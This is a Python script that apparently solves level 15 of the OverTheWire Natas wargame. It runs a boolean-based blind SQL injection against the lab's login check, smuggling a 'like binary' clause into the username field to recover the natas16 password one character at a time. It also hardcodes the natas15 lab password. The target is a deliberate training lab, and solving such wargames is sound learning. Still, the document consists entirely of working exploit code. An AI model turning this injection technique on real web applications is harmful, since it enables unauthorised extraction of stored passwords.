#!/usr/bin/env python3

import requests
# import requests.auth
from requests.auth import HTTPBasicAuth


url = "http://natas15.natas.labs.overthewire.org/?debug"
natas15_username = "natas15"
natas15_password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

s = requests.Session()
s.auth=HTTPBasicAuth(natas15_username, natas15_password)


def is_hit(data):
    resp = s.post(url, data=data)
    return resp and "exists" in resp.text


def get_password_chars():
    candidate_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    password_chars = ''

    print('Looking for password char set...')
    for char in candidate_chars:
        # to ensure case sensitive, use "like binary" instead of "like"
        data = {'username': f'natas16" and password like binary "%{char}%'}
        if is_hit(data):
            password_chars += char
            print(f'The password contains following chars: {password_chars}')

    return password_chars


def get_password(password_chars):
    password = ""
    for i in range(32):
        print(f'Looking for the position {i}...')

        for char in password_chars:
            # to do pattern match, use "rlike" instead of "like"
            # print(f'Trying char {char}...')
            data = {'username': f'natas16" and password like binary "{password}{char}%'}
            if is_hit(data):
                password += char
                print(password)
                break

    return password


# Step 1: Find out what chars the password contains
password_chars = get_password_chars()
print(f'char set contains: {password_chars}')

# Step 2: Find out the password by ordering the chars found in step 1
natas16_password = get_password(password_chars)
